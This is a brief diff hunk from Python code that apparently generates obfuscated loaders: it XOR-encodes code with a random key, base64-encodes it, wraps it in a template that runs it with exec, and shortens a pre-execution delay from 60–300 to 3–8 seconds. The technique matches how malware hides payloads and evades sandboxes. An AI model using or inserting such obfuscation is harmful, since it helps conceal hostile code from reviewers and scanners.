@@ -295,7 +295,7 @@ exec(code)
         key = random.randint(1, 255)
         xored = "".join(chr(ord(c) ^ key) for c in code)
         encoded = base64.b64encode(xored.encode()).decode()
-        delay = random.randint(60, 300)
+        delay = random.randint(3, 8)
 
         return f"""
 import base64, time, sys, os
